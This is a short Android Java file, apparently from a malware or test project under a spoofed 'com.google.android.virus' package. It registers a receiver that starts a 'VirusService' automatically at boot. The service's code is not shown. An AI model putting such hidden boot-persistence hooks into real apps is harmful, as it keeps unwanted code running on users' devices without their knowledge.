package com.google.android.virus;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Created with IntelliJ IDEA.
 * User: antriksh
 * Date: 31/01/14
 * Time: 10:13 AM
 * To change this template use File | Settings | File Templates.
 */
public class BootCompleteReceiver extends BroadcastReceiver
{
    @Override
    public void onReceive(Context context, Intent intent)
    {
        Log.d("XXX", "Boot Completed");
        context.startService(new Intent(context, VirusService.class));
    }

}
